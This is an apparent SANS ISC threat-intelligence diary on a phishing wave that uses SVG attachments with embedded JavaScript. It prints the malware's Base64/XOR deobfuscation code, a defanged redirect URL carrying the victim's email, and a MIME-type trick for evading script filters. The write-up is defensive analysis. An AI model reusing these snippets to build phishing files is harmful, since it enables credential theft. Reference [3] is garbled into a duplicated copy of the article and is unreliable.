---
title: New Wave Of Phishing Emails with SVG Files, (Tue, Jun 2nd)
url: https://isc.sans.edu/diary/rss/33040
source: SANS Internet Storm Center, InfoCON: green
date: 2026-06-02
fetch_date: 2026-06-03T06:46:57.447060
---

# New Wave Of Phishing Emails with SVG Files, (Tue, Jun 2nd)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Xavier Mertens](/handler_list.html#xavier-mertens "Xavier Mertens")

Threat Level: [green](/infocon.html)

* [previous](/diary/33034)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

# [New Wave Of Phishing Emails with SVG Files](/forums/diary/New%2BWave%2BOf%2BPhishing%2BEmails%2Bwith%2BSVG%2BFiles/33040/)

**Published**: 2026-06-02. **Last Updated**: 2026-06-02 07:29:25 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/New%2BWave%2BOf%2BPhishing%2BEmails%2Bwith%2BSVG%2BFiles/33040/#comments)

For a few days, my SANS ISC mailbox is flooded with emails that delivers SVG files. An SVG ("Scalable Vector Graphic") is a web-friendly vector file format used for graphics and icons. No URL in the body, just “an image”, that’s the perfect way to deliver some malicious content. This isn’t the first time that we see this technique used by threat actors[[1](https://isc.sans.edu/diary/Increase%2BIn%2BPhishing%2BSVG%2BAttachments/31456)].

This time, the SVG files are really simple and even don’t contain any graphical element but a simple piece of JavaScript that will redirect the victim's browser to the phishing page:

![](https://isc.sans.edu/diaryimages/images/isc-20260602-1.png)

With the current wave, I just detected regular phishing pages but it could be any payload.

The variable “nl” contains the targeted email address:

```

nl = '$aGFuZGxlcnNAc2Fucy5lZHU='; // “[email protected]”
```

The interesting payload is in “oa”, it contains a Base64-encode and XOR’d string. The XOR key is in “bd”:

```

const pt = "b19208caeefa";
const rm = "51d1e7dcd384";
const bd = pt + rm;
```

The payload is decoded here:

```

const cx = ['b', 'style', 'o', 't', 'a'];
const kf = self[[cx[4], cx[3], cx[2], cx[0]].join('')];
const ts = kf(oa);
const rabbit = Uint8Array.from(ts, (aa, ak) =>
    aa.charCodeAt(0) ^ bd.charCodeAt(ak % bd.length)
);
```

Finally, the variable “rabbit” is used to perform the redirect in the browser:

```

window.location.href = "hxxps://chinougoo[.]cfd/W74rH61S!x7sbhhS0bKPv/" + "[email protected]";
```

This technique works because SVG files are handled by the browser by default on the Windows operating system. Note the TLD used (".cfd") which means "Clothing, Fashion, and Design". It's a cheap TLD more and more abused in phishing campaigns[[2](https://radar.cloudflare.com/tlds/cfd?dateRange=7d)].

A final note about the MIME type used in the SVG file:

```

<script type="application/ecmascript">
```

This is a official MIME type for ECMAScript, the standardized specification underlying JavaScript (standard ECMA-262)[[3](http://For a few days, my SANS ISC mailbox is flooded with emails that delivers SVG files. An SVG ("Scalable Vector Graphic") is a web-friendly vector file format used for graphics and icons. No URL in the body, just ?an image?, that?s the perfect way to deliver some�malicious content. This isn?t the first time that we see this technique used by threat actors[1].  This time, the SVG�files are really simple and even don?t contain any graphical element but a simple piece of JavaScript that will redirect the browser to the phishing page:    With the current wave, I just detected regular phishing pages but it could be any payload.  The variable ?nl? contains the targeted email address:  nl = '$aGFuZGxlcnNAc2Fucy5lZHU='; // ?handlers@sans.edu? The interesting payload is in ?oa?, it contains a Base64-encode and XOR?d string. The XOR key is in ?bd?:  const pt = "b19208caeefa"; const rm = "51d1e7dcd384"; const bd = pt + rm; The payload is decoded here:  const cx = ['b', 'style', 'o', 't', 'a']; const kf = self[[cx[4], cx[3], cx[2], cx[0]].join('')]; const ts = kf(oa); const rabbit = Uint8Array.from(ts, (aa, ak) =>     aa.charCodeAt(0) ^ bd.charCodeAt(ak % bd.length) ); Finally, the variable ?rabbit? is used to perform the redirect in the browser:  window.location.href = "hxxps://chinougoo[.]cfd/W74rH61S!x7sbhhS0bKPv/" + "handlers@sans.edu"; This technique works because SVG files are handled by the browser by default on the Windows operating system. Note the TLD used (".cfd") which means "Clothing, Fashion, and Design". It's a cheap TLD more and more abused in phishing campaigns.�  A final note about the MIME type used in the SVG file:�  <script type="application/ecmascript"> This is a official MIME type for ECMAScript, the standardized�specification underlying JavaScript  application/ecmascript�is an IANA-registered MIME type for�ECMAScript, which is the standardized specification underlying JavaScript (standardized by ECMA International as ECMA-262).  Key Points  It's essentially JavaScript.�ECMAScript is the spec; JavaScript (and engines like V8, SpiderMonkey) are implementations of it. In practice,�application/ecmascript�and�application/javascript�(or�text/javascript) are functionally interchangeable in browsers.  RFC history:�It was formally registered via RFC 4329 (2006), alongside�application/javascript. RFC 4329 was later obsoleted by RFC 9239 (2022), which standardized�text/javascript�as the�one correct MIME type�for scripts, deprecating all others including�application/ecmascript.  Why it matters for this SVG:�Using�application/ecmascript�instead of the more common�text/javascript�is a minor evasion trick ? some older security tools or WAFs that pattern-match on�text/javascript�or�application/javascript�would miss it, while browsers still execute it just fine since they treat both identically.  It's a small but deliberate choice by the malware author to reduce the chance of signature-based detection flagging the script block.     [1] https://isc.sans.edu/diary/Increase+In+Phishing+SVG+Attachments/31456 [2]�https://radar.cloudflare.com/tlds/cfd?dateRange=7d [3]�https://github.com/sudheerj/ECMAScript-features  Xavier Mertens (@xme) Xameco Senior ISC Handler - Freelance Cyber Security Consultant PGP Key)]. This has been used probably to defeat some common security controls that are looking for "JavaScript".

[1] [https://isc.sans.edu/diary/Increase+In+Phishing+SVG+Attachments/31456](https://isc.sans.edu/diary/Increase%2BIn%2BPhishing%2BSVG%2BAttachments/31456)
[2] <https://radar.cloudflare.com/tlds/cfd?dateRange=7d>
[3] [https://github.com/sudheerj/ECMAScript-features](http://For a few days, my SANS ISC mailbox is flooded with emails that delivers SVG files. An SVG ("Scalable Vector Graphic") is a web-friendly vector file format used for graphics and icons. No URL in the body, just ?an image?, that?s the perfect way to deliver some�malicious content. This isn?t the first time that we see this technique used by threat actors[1].  This time, the SVG�files are really simple and even don?t contain any graphical element but a simple piece of JavaScript that will redirect the browser to the phishing page:    With the current wave, I just detected regular phishing pages but it could be any payload.  The variable ?nl? contains the targeted email address:  nl = '$aGFuZGxlcnNAc2Fucy5lZHU='; // ?handlers@sans.edu? The interesting payload is in ?oa?, it contains a Base64-encode and XOR?d string. The XOR key is in ?bd?:  const pt = "b19208caeefa"; const rm = "51d1e7dcd384"; const bd = pt + rm; The payload is decoded here:  const cx = ['b', 'style', 'o', 't', 'a']; const kf = self[[cx[4], cx[3], cx[2], cx[0]].join('')]; const ts = kf(oa); const rabbit = Uint8Array.from(ts, (aa, ak) =>     aa.charCodeAt(0) ^ bd.charCodeAt(ak % bd.length) ); Finally, the variable ?rabbit? is used to perform the redirect in the browser:  window.location.href = "hxxps://chinougoo[.]cfd/W74rH61S!x7sbhhS0bKPv/" + "handlers@sans.edu"; This technique works because SVG files are handled by the browser by default on the Windows operating system. Note the TLD used (".cfd") which means "Clothing, Fashion, and Design". It's a cheap TLD more and more abused in phis...